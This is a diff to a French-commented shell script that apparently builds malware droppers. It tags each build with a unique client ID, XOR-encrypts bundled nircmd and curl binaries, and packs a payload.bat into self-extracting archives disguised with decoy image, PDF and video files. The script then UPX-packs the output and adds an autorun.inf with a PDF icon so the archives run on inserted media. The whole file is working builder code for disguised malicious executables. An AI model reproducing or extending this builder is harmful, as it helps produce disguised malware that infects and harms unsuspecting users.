@@ -28,22 +28,24 @@ UNIQUE=0
 while [ ${UNIQUE} -eq 0 ]
 do
   UNIQUEID=`echo $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM | md5sum - | tr '[:lower:]' '[:upper:]' | cut -c1-8`
-  grep "${UNIQUEID}" ${WORKDIR}/Clients.txt >/dev/null 2>&1
+  grep "${UNIQUEID}" ${WORKDIR}/WWW/private/Clients.txt >/dev/null 2>&1
   UNIQUE=$?
 done
 echo " >>> Génération : ${UNIQUEID}"
 OUTPUTDIR=${WORKDIR}/outfile/${UNIQUEID}
 echo "${UNIQUEID}" > ${TEMPDIR}/client.id
-echo "${UNIQUEID}:ChangeMyEmail@edgtslfcbngq6sk.space:Script kiddies" >> ${WORKDIR}/Clients.txt
+echo "${UNIQUEID}:ChangeMyEmail@edgtslfcbngq6sk.space:Script kiddies" >> ${WORKDIR}/WWW/private/Clients.txt
 echo
 
 echo "Chiffrement des binaires embarqués"
 cp ${WORKDIR}/xor/xor.exe      ${TEMPDIR}/${UNIQUEID}X.exe
+cp ${WORKDIR}/xor/cygwin1.dll  ${TEMPDIR}/cygwin1.dll
 ${TEMPDIR}/${UNIQUEID}X.exe -k ${UNIQUEID} -s -i ${WORKDIR}/base/nircmdc.exe -o ${TEMPDIR}/${UNIQUEID}N.bin
 ${TEMPDIR}/${UNIQUEID}X.exe -k ${UNIQUEID} -s -i ${WORKDIR}/base/curl.exe    -o ${TEMPDIR}/${UNIQUEID}C.bin
 
 echo "Préparation du répertoire de travail"
 cp ${WORKDIR}/base/payload.bat ${TEMPDIR}/${UNIQUEID}P.bat
+
 for i in CryptTables.dat image.jpg image.png document.pdf video.mp4
 do
   cp ${WORKDIR}/base/$i ${TEMPDIR}/${i}
@@ -62,11 +64,11 @@ ${PAUSE}
 
 echo "Creation des archives ..."
 cd ${TEMPDIR}
-${ZIP} a exe.7z ${UNIQUEID}P.bat *.bin client.id CryptTables.dat
-${ZIP} a jpg.7z ${UNIQUEID}P.bat *.bin client.id image.jpg
-${ZIP} a png.7z ${UNIQUEID}P.bat *.bin client.id image.png
-${ZIP} a pdf.7z ${UNIQUEID}P.bat *.bin client.id document.pdf
-${ZIP} a mp4.7z ${UNIQUEID}P.bat *.bin client.id video.mp4
+${ZIP} a exe.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll CryptTables.dat
+${ZIP} a jpg.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll image.jpg
+${ZIP} a png.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll image.png
+${ZIP} a pdf.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll document.pdf
+${ZIP} a mp4.7z ${UNIQUEID}P.bat *.bin client.id ${UNIQUEID}X.exe cygwin1.dll video.mp4
 
 echo "Creation des autoextractibles ..."
 for i in ${EXTENTIONS}
@@ -104,6 +106,8 @@ for i in ${EXTENTIONS}
 do
   mv ${i}.exe ${i}.upx.exe ${OUTPUTDIR}
 done
+cp ${WORKDIR}/base/autorun.inf ${OUTDIR}/
+cp ${WORKDIR}/base/icon_pdf.ico ${OUTDIR}/autorun.ico
 
 ${PAUSE}
 
